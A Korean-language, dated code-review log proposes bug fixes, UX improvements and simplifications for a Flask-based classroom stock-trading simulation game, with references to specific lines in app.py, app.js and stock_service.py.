- **`_quiz_state`·`_quiz_settings` 인메모리 딕셔너리** (`app.py:560-561`): Render 무료 티어는 15분 비활성 시 dyno를 재시작함. 게임 도중 재시작되면 모든 쿨다운과 퀴즈 설정이 초기화되어 학생들이 쿨다운 없이 반복 퀴즈를 풀 수 있음. `Room` 모델에 `quiz_reward_pct`·`quiz_penalty_pct` 컬럼을 추가하고, 쿨다운은 `RoomMember`에 `quiz_cooldown_until` 컬럼으로 DB에 저장하면 재시작 후에도 상태 유지.

- **`force_price()` 후 `_current_biases` 미갱신** (`stock_service.py:175-196`): 진행자가 특정 종목을 강제로 올리거나 내린 직후 다음 주기에 `_current_biases`에 반영되지 않아 가격이 원래 방향으로 되돌아갈 수 있음. `force_price()` 내부에서 `self._current_biases[symbol] = direction`를 추가(`stock_service.py:193` 부근)하면 강제 조정의 모멘텀이 다음 사이클에도 유지됨.

- **진행자 바차트 매 10초 전체 재생성** (`app.js:328-365`): `renderHostBarChart()`가 매번 기존 차트를 `destroy()`하고 새로 생성해 깜빡임 발생 (어제 분석과 연계). 추가로, `loadHostMembers()` 자체가 진행자 탭에 관계없이 10초마다 호출되므로 `htab-rank` 탭이 비활성 상태일 때는 DOM 조작 없이 데이터만 가져오도록 `if (S.hostTab !== 'rank') return;` 가드를 `renderHostBarChart` 시작부에 추가 권장 (`app.js:328`).

---

## 2026-06-12

### 추가하면 좋을 기능

- **참여자 로비 멤버 목록 실질적 버그 수정** (`app.py:223-233`, `app.js:420-428`): `GET /api/rooms/<rid>/host/lobby-members`는 `room.host_id != user.id` 조건으로 참여자에게 403을 반환함. 하지만 `loadPLobbyMembers()`(app.js:420)는 이 엔드포인트를 그대로 호출 — `if (!Array.isArray(data)) return` 가드가 에러 응답을 조용히 무시해 참여자 대기 화면의 "대기 중인 참여자" 목록이 항상 비어 있음. 호스트 체크 없이 멤버 목록만 반환하는 `GET /api/rooms/<rid>/members` 엔드포인트를 별도 추가하거나, `lobby_members`에서 호스트 전용 체크를 제거하는 것으로 수정 가능.

- **게임 종료 후 개인 포트폴리오 상세 확인 불가** (`index.html:424-444`, `app.js:1126-1170`): 결과 화면(`screen-results`)은 최종 순위·총 자산·수익률만 표시하고 보유 종목별 손익이나 거래 내역은 볼 수 없음. 수업 후 토론을 위해 게임이 끝나도 `GET /api/rooms/<rid>/portfolio`와 `GET /api/rooms/<rid>/transactions` 응답을 결과 화면에 "내 거래 내역 펼치기" 섹션으로 추가하면 학습 효과 대폭 향상.

- **매수/매도 버튼 중복 클릭 방지** (`app.js:863-876`): `execTrade()`가 API 호출 중 버튼을 비활성화하지 않아, 학생이 빠르게 두 번 클릭하면 동일 주문이 두 번 실행될 수 있음. 호출 시작 시 매수/매도 버튼을 `disabled = true`로 설정하고, 응답 수신 후 다시 `disabled = false`로 되돌리는 것만으로 충분.

- **종료된 방 목록 조회 엔드포인트** (`app.py:80-86`): `find_active_room()`은 `waiting`·`active` 상태만 찾음. 게임이 끝난 후 홈으로 돌아가면 해당 방 결과를 다시 볼 방법이 없음. `GET /api/rooms/my-rooms` (또는 `?status=ended`) 엔드포인트를 추가하고 결과 화면에 "이전 게임 보기" 링크를 두면 교사가 수업 후 결과를 재확인할 수 있음.

- **자산 변화 차트가 포트폴리오 탭 진입 시에만 그려짐** (`app.js:929-964`, `index.html:302-306`): `asset-line-chart`는 `loadPortfolio()` 내부에서만 렌더링됨. 학생이 포트폴리오 탭을 한 번도 열지 않으면 `S.assetHistory`에 데이터가 쌓여도 차트가 보이지 않음. `refreshMyRank()`에서 이미 `S.assetHistory`를 누적하므로(`app.js:480-482`), 포트폴리오 탭 진입 시 또는 일정 포인트 이상 쌓이면 자동으로 차트가 갱신되도록 하면 학생이 자신의 수익 추이를 놓치지 않음.

- **진행자 전체 학생 일괄 현금 지급** (`app.py:235-251`, `index.html:500-520`): 현재 `host_adjust`는 단일 참여자에게만 조정 가능. 이벤트 보상·벌금을 전체 학생에게 동시에 적용하려면 매번 30명을 개별 조정해야 함. `user_id` 대신 `'all'` 값을 허용하거나 별도 `POST /api/rooms/<rid>/host/adjust-all` 엔드포인트를 추가하면 현장 편의성 대폭 향상.

- **알 수 없는 사용자 공유 계정 위험** (`app.py:108-115`): `User.query.filter_by(username=u).first()`는 학번+이름 조합이 동일한 모든 입력을 같은 계정으로 처리함. 같은 반에 동명이인이 있거나 학번 없이 이름만 입력한 경우 두 학생이 동일 계정·동일 포트폴리오를 공유하게 됨. 단기 해결책으로 room-join 시 이미 해당 username이 다른 활성 세션에서 접속 중이면 경고 메시지를 표시하도록 처리 가능.

---

### 제거/단순화할 것들

- **`/host/lobby-members` "host" 접두사 오해 유발** (`app.py:223`): URL 경로가 `/host/lobby-members`이지만 참여자 화면에서도 이 엔드포인트를 직접 호출함 (`app.js:421`). 위 버그 수정과 함께 `/api/rooms/<rid>/members`(or `lobby-members`)로 경로를 이동하고 `@login_required`만 유지하면 역할 구분이 명확해짐.

- **`refreshMyRank()` 전체 순위 배열 → 개인 통계 전용 호출로 대체** (`app.js:465-483`): 참여자 게임 화면에서 5초마다 `GET /api/rooms/<rid>/rankings`를 호출해 전체 배열을 내려받은 뒤 `data.find(e => e.is_me)`로 자신의 항목 하나만 사용함. 참여자 30명이면 분당 360회의 전체 순위 직렬화 발생. `GET /api/rooms/<rid>/my-stats`처럼 현재 사용자의 `{rank, total_value, gain_pct}`만 반환하는 경량 엔드포인트로 교체하면 서버 부하와 응답 크기를 모두 줄일 수 있음.

- **`stock_service.py:207` 기간 키 불일치** (`stock_service.py:207`, `app.py:335`): `get_history()` 내부 `n_bars` 딕셔너리는 `'5d': 5` 키를 사용하지만, `app.py:335`의 period 매핑은 UI 파라미터 `'1w'`를 yfinance `period='5d'`로 변환해 전달함. `n_bars`에서 `'5d'`가 매칭되어 5개 봉이 생성되는 건 우연히 맞아떨어지는 것이며, `'1d'` 키도 하루치 30봉을 의미하는지 30일치를 의미하는지 불명확. 키를 실제 UI 파라미터(`'1d'`, `'1w'`, `'1mo'`, `'3mo'`, `'1y'`)로 통일하고 `n_bars` 값을 명확히 재정의하면 혼란 방지.

- **`enterParticipantGame()`의 PAGE_ORDER 초기화 루프** (`app.js:437-445`): 게임 진입 시 `PAGE_ORDER.forEach`로 모든 페이지를 순회하며 `hidden` 속성을 개별 토글함. `screen-p-game`이 처음 로드될 때는 `market` 외 모든 페이지가 이미 `hidden`이므로 이 루프는 실질적으로 시장 탭만 보이게 하는 작업. `document.querySelectorAll('#screen-p-game .page').forEach(el => el.setAttribute('hidden',''))` 후 `document.getElementById('pg-market').removeAttribute('hidden')` 두 줄로 단순화 가능.

- **`get_room()` 자동 종료 체크가 일부 엔드포인트에서 누락** (`app.py:169-175`, `app.py:427-443`): `get_room()` 라우트는 `end_time` 초과 시 자동으로 `_end_room()`을 호출하지만, `get_rankings()`·`get_portfolio()` 등 다른 엔드포인트는 만료 체크 없이 `active` 상태를 반환함. 선생님이 탭을 닫아도 학생 폴링이 계속되면 종료 시각이 지난 뒤에도 `remaining_seconds`가 0으로 보이지 않아 타이머가 계속 카운트됨. 자동 종료 체크를 `before_request` 훅이나 공통 `get_active_room()` 헬퍼로 통합하면 일관성 보장.

---

## 2026-06-13

### 추가하면 좋을 기능

- **진행자 전체화면 순위판(프로젝터 모드)** (`app.py:427-443`, `index.html:128-131`): 교실에서 교사가 빔 프로젝터로 화면을 띄울 때 진행자 대시보드는 모바일 레이아웃이라 읽기 어려움. `/api/rooms/<rid>/rankings`를 주기적으로 폴링해 순위·수익률·타이머를 큰 글씨로 표시하는 `/projector?room=<rid>` 전용 페이지를 추가하면 수업 몰입도 향상. 별도 인증 없이 방 코드 URL만으로 접근 가능하게 하고 자동 새로고침(5초)만 구현해도 즉시 활용 가능.

- **`host_adjust` delta 입력값 범위 검증 없음** (`app.py:243-244`): `delta = float(d.get('delta', 0))`에 최소/최대 검증이 전혀 없음. 교사가 `500000000`(5억)을 `5000000`(500만) 대신 실수로 입력하면 학생의 자산이 비정상적으로 커짐. `if abs(delta) > room.starting_cash * 10: return jsonify({'error': ...}), 400` 정도의 상한선을 추가하거나, 프론트엔드 `adj-delta` 입력에 `max`/`min` 속성을 `room.starting_cash` 기준으로 설정하면 실수 방지 가능 (`index.html:511`, `app.js:382`).

- **폭탄뉴스 팝업 수동 닫기 불가** (`app.js:619-647`): 팝업이 3초 후 자동으로 사라지고(`app.js:644`) 학생이 직접 닫을 수 없음. 읽는 속도가 느린 학생은 내용을 놓침. 팝업 우상단에 `×` 버튼을 추가해 `_newsPopupTimer`를 클리어하고 팝업을 즉시 숨길 수 있게 하거나, 클릭 시 팝업이 닫히도록 `onclick` 핸들러를 `.bomb-news-inner`에 추가하는 것이 가장 간단한 해법 (`index.html:533-546`).

- **`get_history()` 1년 차트 봉 수 부족** (`stock_service.py:207`, `app.py:335`): `n_bars` 딕셔너리에 `'1y'` 키가 없어 기본값 30이 적용됨. UI에서 "1년" 탭을 누르면 30개 봉이 표시되지만 1년치 주간 데이터라면 최소 52개 봉이 필요. `stock_service.py:207` 딕셔너리에 `'1y': 52`를 추가하면 해결. 함께 `'1d': 78`(5분봉 기준 6.5시간)처럼 기간별 봉 수를 의미 있게 재정의하면 더 완성도 있는 차트 제공 가능.

- **진행자가 개별 참여자 포트폴리오 확인 불가** (`app.py:204-221`, `index.html:134-140`): 진행자 순위 화면에서 학생 이름을 눌러도 해당 학생의 보유 종목 내역이 보이지 않음. 수업 중 교사가 특정 학생의 투자 전략을 확인하거나 설명할 때 유용함. `GET /api/rooms/<rid>/host/member-portfolio?uid=<uid>` 엔드포인트를 추가하고 `host-member-row` 클릭 시 모달로 보유 종목 목록을 표시하면 교육적 활용도가 높아짐.

- **엑셀 내보내기가 게임 진행 중에도 호출 가능** (`app.py:632-701`): `export_rankings()`는 `room.host_id == user.id` 체크만 하고 `room.status`를 확인하지 않음. 게임 중간에 다운로드하면 부분적인 최종 자산이 "결과"로 저장될 수 있음. `if room.status != 'ended'` 조건을 추가하거나 경고 헤더(`X-Game-Status: active`)를 응답에 포함해 교사에게 알리는 방안 권장.

---

### 제거/단순화할 것들

- **`force_price()` 구(舊) 타임스탬프 보존으로 강제 가격이 즉시 덮여쓰임** (`stock_service.py:179`): `self._prices[symbol] = (ts, new_price)`에서 기존 `ts`를 재사용하므로, 가격 TTL이 이미 만료된 종목이라면 다음 `get_price()` 호출 시 즉시 새 가격으로 덮어씌어져 교사의 강제 조정이 사라짐. `(ts, new_price)` 대신 `(time.time(), new_price)`로 교체하면 강제 조정 후 최소 `_price_ttl`(기본 20초)이 유지됨.

- **`setDepPct()` 함수가 스테일 `S.depCash` 캐시를 사용** (`app.js:1022-1027`): "10%/25%/50%/전액" 버튼이 `S.depCash`를 기준으로 금액을 계산하는데, `S.depCash`는 거래 완료 또는 예금 페이지 재진입 시에만 갱신됨. 학생이 시장 탭에서 주식을 매도해 현금이 늘어난 뒤 예금 탭으로 오면 이전 현금 기준으로 계산된 금액이 입력되어 혼란을 줌. `loadDepositsPage()` 내에서 `S.depCash = port.cash`를 이미 수행하므로(`app.js:1050`) 버튼은 `S.depCash`가 아닌 해당 함수 완료 후 표시된 값을 참조하도록 초기화 순서를 보장하거나, 매번 `setDepPct()` 호출 시 `dep-cash-display` DOM에서 최신값을 파싱하는 방식으로 단순화 가능.

- **`doAuth()` 이미 세션이 있는 경우에도 매번 API 호출** (`app.js:58-65`, `app.js:110`, `app.js:130`): `doCreateRoom()`과 `doJoinRoom()` 모두 `doAuth(sid, name)`를 항상 호출함. 이미 `S.user`가 설정되어 있고 사용자명이 동일한 경우에도 `POST /api/auth/enter`가 실행됨. 한 학생이 같은 이름으로 두 번 입장하면 문제없지만, 만약 앞서 방에 참여했다가 새로 입력하는 경우 의도치 않게 다른 계정이 만들어질 수 있음. `if (S.user && S.user.username === \`${sid} ${name}\`) { /* skip doAuth */ }` 가드를 추가하면 불필요한 왕복 요청 1건 절약.

- **진행자 바차트 y축 이름 잘림 (30명 이상 시)** (`app.js:350`, `app.js:328-365`): `y: {ticks: {color: '#e6edf3'}}` 설정에 `maxTicksLimit`이나 `callback`이 없어 학생이 많아질수록 이름이 겹치거나 잘림. `ticks: { callback: (_, i) => labels[i]?.length > 8 ? labels[i].slice(0,8)+'…' : labels[i], font:{size:10} }` 형태로 이름을 잘라주거나, 학생 수가 15명 초과 시 차트 컨테이너 높이를 `members.length * 28`px로 동적 조정하면 가독성 향상. `app.js:329` 참조.

- **`enterParticipantGame()` 페이지 초기화 루프 후 불필요한 `querySelector` 호출** (`app.js:437-445`, `app.js:443`): `PAGE_ORDER.forEach` 루프 후 `document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'))`와 `document.getElementById('nav-market').classList.add('active')` 두 줄이 나오는데, 게임에 처음 입장하는 경우 `.nav-item.active`는 항상 `nav-market`이어야 하므로 루프 전체를 `document.querySelectorAll('#screen-p-game .page').forEach(p => p.setAttribute('hidden',''))` + `document.getElementById('pg-market').removeAttribute('hidden')` 두 줄과 nav 리셋 1회로 단순화 가능 (어제 제안과 연계, 실제 코드 변경은 간단함).

---

## 2026-06-14

### 추가하면 좋을 기능

- **종목 목표가/손절가 알림** (`app.js:784-796`, `app.js:868-879`): 학생이 특정 종목에 목표가 또는 손절가를 설정해 두면 `loadMarket()` 완료 후 현재가와 비교해 `toast('⚡ 삼성전자 목표가 달성!', 'success')`를 표시하는 기능. `localStorage`에 `{ symbol: {target, stopLoss} }` 형태로 저장하고, `renderGrid()` 종료 시 `S.stocks` 가격과 비교하는 것만으로 서버 변경 없이 구현 가능. 관심 종목(watchlist) 스타 버튼 옆에 "알림 설정" 버튼을 추가하면 자연스럽게 통합됨.

- **배당금 지급 이벤트 (진행자용)** (`app.py:669-684` market-event 구조 참조): 진행자가 특정 종목 보유자 전원에게 주당 일정 금액을 지급하는 `POST /api/rooms/<rid>/host/dividend` 엔드포인트 추가. `RoomHolding.query.filter_by(room_id=rid, symbol=symbol)` → `member.cash += h.shares * amount_per_share` + `RoomTransaction(action='ADJ', note='배당금')` 기록. 현재 섹터 이벤트 API와 같은 구조로 50줄 미만 코드로 구현 가능하며, 배당 개념을 교실에서 실체감 있게 체험할 수 있는 교육 효과가 큼.

- **실시간 거래 피드 (진행자 대시보드)** (`app.py:504-522`, `index.html:138-145`): `GET /api/rooms/<rid>/host/recent-trades?limit=10`으로 방 전체 최근 거래 10건을 반환하는 엔드포인트를 추가하고, 진행자 순위 탭 하단에 "최근 거래 피드" 패널 표시. `RoomTransaction`을 타임스탬프 역순으로 조회해 `{username, action, symbol, shares, amount, timestamp}`를 반환하면 충분. 어떤 학생이 어떤 종목을 대량 매수/매도하는지 즉시 파악해 교사가 "지금 OO이 삼성전자를 전량 매도했네요, 왜 그랬을까요?" 식의 수업 개입 포인트를 실시간으로 찾을 수 있음.

- **순위 변화 화살표 시각화** (`app.js:374-395`, `app.js:1219-1236`): `loadHostMembers()` / `loadParticipantRankings()` 응답을 수신할 때마다 이전 순위를 `S.prevHostRanks`, `S.prevRanks` 딕셔너리에 저장하고, 다음 렌더링 시 `delta = prevRank - curRank`를 계산해 상승(`▲+N`)·하락(`▼-N`) 뱃지를 이름 옆에 표시. 서버 변경 없이 클라이언트에서만 구현 가능하며, 순위표에 역동성이 생겨 학생 참여도가 높아짐. `app.js:383`의 `gain_pct` 스팬 바로 앞에 `<span class="rank-delta">${...}</span>` 한 줄 추가.

- **학생 마지막 접속 시간 표시** (`models.py:44-51`, `app.py:483-499`): `RoomMember`에 `last_seen = db.Column(db.DateTime, nullable=True)` 컬럼을 추가하고, `GET /api/rooms/<rid>/rankings` 또는 `GET /api/rooms/<rid>/portfolio` 호출 시 해당 멤버의 `last_seen`을 `datetime.utcnow()`로 갱신. 진행자 순위 목록에서 현재 시각 기준 3분 이내 접속은 🟢, 이상은 ⚫로 표시하면 누가 앱을 닫았는지 즉시 파악 가능 (`app.py:254`에 `last_seen` 필드 포함). 특히 시험처럼 집중력이 필요한 상황에서 유용.

- **포트폴리오 투자 메모장** (`index.html:pg-portfolio`, `app.js:1003`): 포트폴리오 탭 거래 내역 위에 `<textarea placeholder="왜 이 종목을 샀나요?">` 하나를 추가하고 `localStorage.setItem('memo-' + S.room.id, text)`로 저장. 게임 종료 후 교사가 "각자 왜 이 종목을 선택했나요?"라는 토론을 진행할 때 학생이 메모를 보며 발표하는 수업 활동과 연계 가능. 서버 저장 없이 10줄 이내 구현 가능하며, 방 ID를 키에 포함해 여러 게임의 메모를 구분함.

---

### 제거/단순화할 것들

- **`force_sector_event()` 구 타임스탬프 재사용** (`stock_service.py:213`): 2026-06-13에 `force_price()`의 동일 버그를 지적했으나, `force_sector_event()` 루프 내부도 `self._prices[sym] = (ts, new_price)`에서 기존 `ts`를 그대로 재사용함. 섹터 이벤트 적용 직후 TTL이 이미 만료된 종목은 다음 `get_price()` 호출에서 즉시 새 무작위 가격으로 덮어씌어져 교사의 이벤트 효과가 사라짐. `stock_service.py:213`을 `self._prices[sym] = (time.time(), new_price)`로 교체하면 `force_price`와 동일하게 해결.

- **`api` 객체 HTTP 에러 응답 미처리** (`app.js:24-30`): `api.get()`·`api.post()`가 `(await fetch(url)).json()`을 직접 호출해 HTTP 상태 코드를 확인하지 않음. 서버가 500 에러로 HTML 오류 페이지를 반환하거나 네트워크 오류가 발생하면 `.json()` 파싱 실패로 처리되지 않은 `SyntaxError`가 발생해 UI가 조용히 멈춤. `const r = await fetch(url, opts); if (!r.ok) return {error: \`HTTP \${r.status}\`}; return r.json();` 패턴으로 `api.get`/`api.post`/`api.del` 모두 3줄 수정으로 안정성 대폭 향상.

- **`enterHostGame()` 퀴즈 설정값 미로드** (`app.js:227-241`, `app.py:688-696`): `enterHostGame()`이 `loadNewsInterval()`은 호출해 뉴스·주가 주기를 복원하지만, `GET .../host/quiz-settings`는 호출하지 않음. 진행자가 퀴즈 보상/패널티를 저장한 후 탭을 전환하거나 재접속하면 `quiz-reward-input`과 `quiz-penalty-input`이 항상 1.0%/0.5% 기본값으로 표시됨. `app.js:234` 이후에 `api.get(\`/api/rooms/\${S.room.id}/host/quiz-settings\`).then(d => { if (!d.error) { document.getElementById('quiz-reward-input').value = d.reward_pct; document.getElementById('quiz-penalty-input').value = d.penalty_pct; } });` 한 블록을 추가하면 해결.

- **일시정지 상태에서도 주가 계속 변동** (`stock_service.py:136-153`, `app.py:203-228`): `pause_room()`이 게임을 일시정지해도 학생 폴링(`GET /api/rooms/<rid>/stocks`)이 `svc.get_price()`를 호출해 TTL마다 가격이 계속 변동함. 교사가 "지금부터 주가 고정"을 의도하고 일시정지해도 효과 없음. `StockService`에 `_frozen: bool` 속성과 `freeze()`/`unfreeze()` 메서드를 추가하고, `get_price()` 내 TTL 만료 분기 첫 줄에 `if self._frozen: return price`를 삽입. `pause_room()` (`app.py:203`)과 `resume_room()` (`app.py:215`)에서 각각 `svc.freeze()` / `svc.unfreeze()` 호출.

- **`doDeposit()` · `doWithdraw()` 이중 제출 방지 없음** (`app.js:1192-1215`): 2026-06-12에 `execTrade()` 이중 클릭 문제를 지적했으나, 예금/해지 버튼에도 동일 취약점이 있음. 느린 네트워크에서 "예금하기"를 두 번 클릭하면 동일 금액이 두 번 예금되고, `doWithdraw()`를 두 번 클릭하면 첫 번째 성공 후 두 번째는 `'이미 처리된 예금'` 에러가 나지만 UX를 혼란스럽게 함. `app.js:1196`과 `app.js:1209`에서 API 호출 직전 버튼 `disabled = true`, 응답 후 `disabled = false`를 추가하거나, 모듈 수준 `let _depInFlight = false` 가드를 함수 진입 시 확인하는 방식으로 방지 가능.

- **`Room.query.get_or_404(rid)` 폐기 패턴 전체** (`app.py:184,192,203,215,231,245,265,276,287,307,329,350,366,381,388,399,449,484,506,527,554,558,580,620,636,669,687,708` 등 30여 곳): 2026-06-10에 `User.query.get()` → `db.session.get()` 교체를 권장했으나, 모든 라우트의 `Room.query.get_or_404(rid)`는 그대로 남아 있음. Flask-SQLAlchemy 3.1+에서는 `db.get_or_404(Room, rid)` 패턴을 권장함. 에디터 전체 치환(`Room.query.get_or_404` → `db.get_or_404(Room,`)으로 30초 안에 30여 군데를 일괄 수정 가능하며, SQLAlchemy 2.x 마이그레이션 준비에도 도움.

---

## 2026-06-14 (2차)

### 추가하면 좋을 기능

- **CDN 의존성 → 학교 네트워크 단절 위험** (`index.html:600-602`): Chart.js와 qrcodejs를 `cdn.jsdelivr.net`에서 동적으로 로드함. 한국 학교 인트라넷은 외부 CDN을 차단하거나 네트워크가 불안정한 경우가 잦아, 차트가 전혀 그려지지 않거나 QR코드가 생성되지 않을 수 있음. `npm run build`나 `wget`으로 두 파일을 `static/vendor/`에 미리 내려받아 자체 호스팅하면 CDN 의존 없이 수업 진행 가능.

- **거래 횟수 제한(Rate Limiting) 없음** (`app.py:399-442`): `POST /api/rooms/<rid>/trade`에 사용자·시간 단위 제한이 없어 학생이 스크립트(또는 빠른 반복 클릭)로 초당 수십 건 거래를 실행할 수 있음. 서버 DB에 과부하를 줄 뿐 아니라 게임 공정성도 훼손됨. 가장 간단한 방법은 Flask-Limiter(`pip install flask-limiter`)로 `@limiter.limit("10 per second")` 한 줄 추가하거나, `RoomMember`에 `last_trade_at` 컬럼을 두고 1초 이내 재거래 시 400을 반환하는 방식으로 서버 측 쿨다운 구현.

- **게임 시작 시 최소 인원 체크 없음** (`app.py:189-201`, `app.js:215-224`): `start_room()`은 참여자가 0명이어도 게임을 시작함. 교사가 코드를 배포하기 전에 실수로 "게임 시작"을 누르면 학생들이 없는 상태로 타이머가 시작됨. `RoomMember.query.filter_by(room_id=rid).count()` < 1이면 `{'error': '참여자가 없습니다. 학생이 입장한 후 시작하세요.'}` 로 응답하거나, 프론트에서 `data.member_count === 0`일 때 `doStartGame()` 확인 메시지에 경고를 포함하는 것으로 간단히 방지 가능.

- **종목 모달에서 매도 확인 단계 없음** (`app.js:978-1000`, `index.html:543-546`): 매수는 금액·수량을 보고 버튼을 누르지만, 매도도 동일한 한 번의 탭으로 즉시 실행됨. 보유 수량이 많을 때 실수로 "전량 매도" 후 `setMaxSell()`을 눌러 전액 매도하는 상황이 수업 중 빈번히 발생할 수 있음. 매도 금액이 보유 현금의 30% 이상이면 `confirm('정말 ${shares}주를 매도할까요?')`를 표시하는 조건부 확인 로직을 `execTrade('SELL')` 첫 줄에 추가 권장.

- **진행자 대시보드에 방 설정 정보(초기 자금·게임 시간) 표시 없음** (`index.html:114-135`): 호스트 게임 화면 상단 바(`host-topbar`)에 방 이름·코드·타이머만 있고 초기 자금·총 게임 시간이 없음. 수업 도중 학생이 "제 시작 자금이 얼마예요?" 물을 때 교사가 별도 확인할 방법이 없음. `<div style="font-size:10px">${krw(S.room.starting_cash)} · ${S.room.duration_minutes}분</div>`을 `host-topbar` 방 이름 아래에 한 줄 추가하는 것으로 즉시 해결 가능 (`app.js:228-229`).

---

### 제거/단순화할 것들

- **뉴스 폴링 주기 하드코딩 3초 vs 서버 설정값 불일치** (`app.js:613-624`): 클라이언트는 3초마다 `GET /api/rooms/<rid>/news`를 호출하지만, 서버의 `_news_ttl`은 진행자가 5~300초로 자유롭게 설정 가능. 참여자 30명 × 20회/분 = 600 req/min이 뉴스 조회에만 소비됨. `loadNewsInterval()`에서 이미 `news_seconds`를 받아오므로 (`app.js:351-355`), 참여자 측에서도 첫 `get_room()` 응답에 `news_interval_seconds`를 포함시키거나 별도 쿼리로 받아와 `setInterval(…, news_seconds * 1000)`으로 동적 설정하면 불필요한 요청이 크게 줄어듦.

- **`doEndGame()` API 호출 중 버튼 비활성화 없음** (`app.js:468-476`): `doStartGame()`은 `btn.disabled = true`로 이중 클릭을 방어하지만(`app.js:217-219`), `doEndGame()`에는 동일 처리가 없음. 교사가 종료 버튼을 두 번 클릭하면 첫 번째 `_end_room()`이 예금을 정산하는 도중 두 번째 호출이 `room.status == 'ended'` 체크를 통과해 충돌할 수 있음. `document.querySelector('.btn-danger[onclick="doEndGame()"]').disabled = true` 한 줄을 `doEndGame()` 첫 줄에 추가하면 방지 가능.

- **종료된 방에서 `get_stocks()` 호출 시 새 StockService 생성** (`app.py:327-347`, `stock_service.py:280-284`): `_end_room()`이 `cleanup_room_service(room.id)`를 호출해 서비스를 제거하지만, 결과 화면 도달 전 잠깐 `GET /api/rooms/<rid>/stocks`를 호출하는 경우 `get_room_service(rid)`가 새로운 StockService 인스턴스를 생성해 완전히 다른 무작위 가격을 반환함. `get_stocks()` 맨 앞에 `if room.status == 'ended': return jsonify({'stocks': [], 'sectors': SECTORS})` 체크를 추가하면 불필요한 인스턴스 생성 없이 깔끔하게 처리 가능 (`app.py:330` 직후).

- **`find_active_room()` 이중 쿼리** (`app.py:92-98`): `GET /api/auth/me`가 호출될 때마다 host 체크 쿼리와 member 체크 쿼리를 순차 실행함. 참여자가 많아지면 두 번째 `RoomMember.query.join(Room)` 쿼리에 JOIN 비용이 더해짐. 단일 `UNION` 쿼리 또는 ORM subquery로 통합하거나, 적어도 `Room` 인스턴스를 캐싱해 두 번째 쿼리의 `db.session.get(Room, m.room_id)` 호출을 생략하면 왕복 쿼리 1건 절약.

- **`loadPLobbyMembers()`의 `.catch(() => [])` 로 403 에러 무시** (`app.js:499`): 2026-06-12에 지적된 참여자 로비 멤버 목록 버그(403 반환)가 여전히 수정되지 않은 채 `.catch(() => [])` 가드로 조용히 실패 중. 지금은 "대기 중인 참여자 0명"이 항상 표시됨. 단기 해결책으로 `app.py:275-285`의 `lobby_members` 엔드포인트에서 `if room.host_id != user.id:` 체크를 제거하고 `@login_required`만 남기면 참여자도 로비 목록을 볼 수 있음 — 목록 조회는 민감 정보가 아니므로 보안 위험 없음.

---

## 2026-06-14 (3차)

### 추가하면 좋을 기능

- **일시정지 중 매수/매도 버튼 비활성화** (`app.js:548-561`, `app.js:863-876`): 진행자가 게임을 일시정지하면 배너(`showPausedBanner()`)는 표시되지만 주식 모달의 매수/매도 버튼은 여전히 활성 상태. 서버의 `trade()` 엔드포인트가 `paused` 상태를 체크하더라도, 학생 입장에서는 버튼이 눌리는 것처럼 보여 혼란 유발. `showPausedBanner()` 내에서 `.btn-success, .btn-danger`를 `disabled = true`로 설정하고, `hidePausedBanner()` 시 복원하면 UX와 로직이 일치함.

- **진행자 개별 학생 거래 내역 확인** (`app.js:272-337`, `index.html:134-143`): 진행자 순위 화면에서 학생 행을 클릭해도 아무 반응 없음. `GET /api/rooms/<rid>/host/member-portfolio?uid=<uid>` 엔드포인트를 추가하고 `host-member-row` 클릭 시 해당 학생의 보유 종목·평가 손익을 모달로 표시하면 교사가 수업 중 특정 학생의 투자 전략을 설명 자료로 활용 가능.

- **게임 재진입(새로고침) 시 화면 복원** (`app.js:1505-1511`, `app.py:80-90`): 학생이 실수로 브라우저를 새로고침하면 `screen-landing`으로 돌아가 방 코드를 다시 입력해야 함. `localStorage`에 `{roomId, userId}`를 저장해 두고, 페이지 로드 시 `GET /api/rooms/<rid>` 상태가 `active`면 자동으로 게임 화면으로 복원하면 수업 중 실수로 인한 이탈을 방지할 수 있음 (`app.js:1505` `window.onload` 블록에 추가).

- **거래 후 모달 수량 초기화 누락** (`app.js:972-999`, `index.html:538-541`): `execTrade()` 성공 후 수량 입력(`trade-qty`)이 이전 값을 유지해, 학생이 바로 다시 거래하려 할 때 직전 수량이 그대로 남아 있음. 성공 콜백에서 `document.getElementById('trade-qty').value = 1`과 `updateTotal()`을 호출해 수량과 예상 금액을 초기화하면 이중 주문 실수를 줄일 수 있음.

- **섹터 필터 선택 상태가 모달 닫기 후 초기화됨** (`app.js:784-826`, `index.html:318-323`): 학생이 "반도체" 섹터를 선택한 뒤 종목 모달을 열었다 닫으면 필터가 해제되고 전체 목록이 다시 표시됨. `closeModal('modal-stock')` 시 `S.curSector` 상태를 유지하고 `renderGrid()`를 해당 필터로 재렌더링하면 여러 종목을 연속 비교할 때 편의성 향상.

- **예금 만기 도달 시 자동 알림 없음** (`app.js:527-545`, `app.py:456-489`): 예금이 만기되어 이자가 지급되더라도 학생에게 별도 알림이 없음. 폴링 응답에 `matured_deposits: [{symbol, interest}]` 필드를 추가하고, 만기 예금이 있으면 폭탄뉴스와 유사한 팝업("예금 만기! 이자 ₩XXX 지급")을 표시하면 학생이 예금 전략의 결과를 즉시 인식 가능 (`app.js:530` 폴링 응답 처리 부분에 추가).

---

### 제거/단순화할 것들

- **`execTrade()` 성공 후 중복 DOM 갱신** (`app.js:985-999`): 거래 성공 시 `ms-cash` DOM을 `data.cash`로 직접 갱신한 직후 `refreshMyRank()`를 호출해 같은 값을 다시 API로 가져와 덮어씀. `ms-cash` 직접 갱신을 제거하고 `refreshMyRank()` 응답으로만 헤더·모달 현금을 업데이트하면 API 왕복 없이 코드가 단순해짐.

- **`loadMarket()` 매 호출마다 전체 종목 재요청** (`app.js:784-796`, `app.py:328-345`): 섹터 필터 변경·검색어 입력 시마다 `loadMarket()`이 전체 종목을 다시 받음. 종목의 심볼·이름·섹터는 불변이므로 초기 1회 전체 로드 후 `S.stocks` 캐시에 저장하고 이후 필터링은 로컬에서만 수행하면 요청 횟수와 응답 크기를 크게 줄일 수 있음.

- **`room_dict()` 매 호출 시 호스트명 DB 재조회** (`app.py:70-90`): `room_dict()`는 `db.session.get(User, room.host_id)`로 호스트 이름을 매번 조회함. `get_room()`, `get_rankings()` 등 다수 엔드포인트가 이 함수를 호출하므로 불필요한 SELECT가 반복 발생. `Room` 모델에 `host_name = db.Column(db.String(50))` 컬럼을 추가해 방 생성 시 한 번만 저장하면 조인 없이 해결 가능.

